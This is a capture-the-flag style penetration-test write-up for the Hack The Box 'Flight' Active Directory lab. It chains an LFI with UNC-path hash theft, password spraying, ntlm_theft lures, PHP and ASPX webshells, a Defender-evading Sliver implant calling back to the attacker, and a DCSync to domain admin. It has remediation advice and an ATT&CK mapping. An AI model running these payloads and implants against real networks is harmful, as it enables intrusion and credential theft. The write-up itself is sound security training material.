# Penetration Test Report — Flight

![Difficulty](https://img.shields.io/badge/difficulty-Hard-red) ![OS](https://img.shields.io/badge/OS-Windows%20AD-blue) ![Focus](https://img.shields.io/badge/focus-LFI%20%2F%20NTLM%20theft%20%2F%20DCSync-black)

## Executive Summary

An authorized assessment of `target.htb` (Domain Controller, `flight.htb`) chained seven steps from anonymous access to domain compromise: virtual-host enumeration revealed an LFI-vulnerable site; a UNC-path LFI leaked the `svc_apache` NetNTLM hash; password spraying discovered password reuse by `s.moon`; `ntlm_theft` files planted in a writable share captured `c.bum`'s hash; write access to the webroot produced code execution; an ASPX webshell on a localhost-only IIS site yielded the machine-account context; and a **DCSync** attack using the machine account's ticket dumped the Administrator hash.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | LFI in `school.flight.htb` (filter bypass via `/` for `\`) | High |
| 2 | UNC-path LFI → forced NTLM authentication (hash theft) | High |
| 3 | Password reuse across accounts (`svc_apache` → `s.moon`) | High |
| 4 | Writable shared folder accessed by other users → NTLMv2 theft via `.ini` files | High |
| 5 | Writable webroot → RCE; localhost-only IIS site writable by WebDevs | High |
| 6 | Machine-account ticket used for DCSync | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 target.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV target.htb
echo "target.htb flight.htb" | sudo tee -a /etc/hosts
```

Many AD ports; Apache on 80; 7-hour clock skew noted (sync before Kerberos). Vhost discovery:

```bash
ffuf -u "http://flight.htb" -H "Host: FUZZ.flight.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50 -fs 229
# school.flight.htb
```

### 2. LFI → NTLM Hash Theft

`school.flight.htb/index.php?view=` included files. The `\` filter was bypassed with `/`:

```
http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts
```

A UNC path forced the Apache service account to authenticate to a Responder listener:

```
http://school.flight.htb/index.php?view=//<attacker-ip>/htb
```

```bash
responder -I tun0 -v
john hash --wordlist=/usr/share/wordlists/rockyou.txt
# svc_apache : S@Ss!K@*t13
```

### 3. Password Spray → s.moon → NTLM Theft → c.bum

Valid usernames were enumerated via `impacket-lookupsid`. Password reuse was confirmed by spraying:

```bash
impacket-lookupsid svc_apache:'S@Ss!K@*t13'@'flight.htb'
crackmapexec smb flight.htb -u ./users -p 'S@Ss!K@*t13'
# hit: S.Moon
```

`s.moon` had WRITE on the empty `Shared` share. `ntlm_theft` generated hash-harvesting files; only `.ini` files were accepted by the share — sufficient:

```bash
git clone https://github.com/Greenwolf/ntlm_theft
python3 ntlm_theft.py --generate all --server <attacker-ip> --filename htb
# upload the (BROWSE TO FOLDER) .ini files to the Shared share
responder -I tun0 -v
john --wordlist=/usr/share/wordlists/rockyou.txt hash
# c.bum : Tikkycoll_431012284
```

User flag: `Users/C.bum/Desktop`.

### 4. RCE via Web Share → Sliver → c.bum

`c.bum` had WRITE on the `Web` share (webroot). A PHP shell gave code execution as `svc_apache`; a **Sliver** implant (Defender-evading by default) provided a stable session, and RunasCs pivoted to `c.bum`:

```php
<?php echo system($_GET['c']); ?>
```

```bash
curl https://sliver.sh/install | sudo bash && sliver
generate --os windows --arch 64bit --mtls <attacker-ip> --reconnect 60 --save htb.exe
mtls
```

```
upload /opt/RunasCs.exe
.\RunasCs.exe c.bum Tikkycoll_431012284 -l 2 "C:\users\public\music\htb.exe"
```

### 5. Privilege Escalation — IIS Virtual Account → Machine Account → DCSync

As `c.bum` (member of **WebDevs**), a localhost-only site on port 8000 (`C:\inetpub\development`) was reachable via a Sliver SOCKS5 proxy. An ASPX webshell was planted:

```aspx
<%@Page Language="C#"%><%var p=new System.Diagnostics.Process{StartInfo={FileName=Request["c"],UseShellExecute=false,RedirectStandardOutput=true}};p.Start();%><%=p.StandardOutput.ReadToEnd()%>
```

```
http://127.0.0.1:8000/shell.aspx?c=C:\users\public\music\htb.exe
```

The new session ran as `IIS APPPOOL\DefaultAppPool` — a **virtual account** that authenticates to the network *as the machine account*. Rubeus requested a machine-account TGT, used for DCSync:

```
sliver> armory install rubeus
sliver> rubeus tgtdeleg /nowrap
```

```bash
cat ticket.b64 | base64 -d > ticket.kirbi
kirbi2ccache ticket.kirbi ticket.ccache
sudo ntpdate -u flight.htb
KRB5CCNAME=ticket.ccache impacket-secretsdump -k -no-pass g0.flight.htb \
  -just-dc-user Administrator -target-ip target.htb

impacket-psexec Administrator@flight.htb \
  -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
```

Root flag: `C:\Users\Administrator\Desktop\root.txt`.

**Alternative:** `IIS APPPOOL\DefaultAppPool` holds **SeImpersonatePrivilege** — SweetPotato (`-e EfsRpc`) yields a direct `NT AUTHORITY\SYSTEM` session.

## Remediation

- Fix LFI: strict allowlists of includable resources; block UNC paths (disable WebClient/SMB egress).
- Enforce unique passwords; enable account lockout and breach-password screening.
- Restrict write access on shared folders and webroots; audit `.ini`/shortcut-based hash-theft artifacts.
- Disable the WebClient service on servers; block NTLM where possible; enable SMB signing and EPA.
- Monitor DCSync (replication from non-DCs) and machine-account ticket anomalies; restrict WebDevs write scope.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1190 — Exploit Public-Facing Application (LFI) |
| Credential Access | T1557.001 — Forced Authentication (NTLM theft, Responder) |
| Lateral Movement | T1021.002/006 — SMB / WinRM |
| Credential Access | T1003.006 — DCSync |
| Defense Evasion | T1027 — Obfuscated implants (Sliver) |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
